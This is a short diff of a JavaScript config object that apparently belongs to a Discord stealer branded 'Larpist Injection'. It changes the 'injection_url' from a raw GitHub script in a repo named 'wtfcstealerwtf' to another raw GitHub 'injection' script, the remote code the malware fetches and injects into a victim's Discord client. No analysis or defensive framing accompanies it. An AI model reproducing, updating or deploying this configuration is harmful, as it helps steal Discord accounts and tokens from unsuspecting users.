@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Larpist Injection', 
   embed_icon: 'https://media.discordapp.net/attachments/1234182404248178848/1234184692660568105/larplogov3.png?ex=664b7f10&is=664a2d90&hm=3ddc11922dddf11f5d6c9b94a97806a9b471f40d6fe2b49f3f66e5b657e5af7b&=&format=webp&quality=lossless'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/depicting/injection/main/index.js', 
   /**
    
    **/
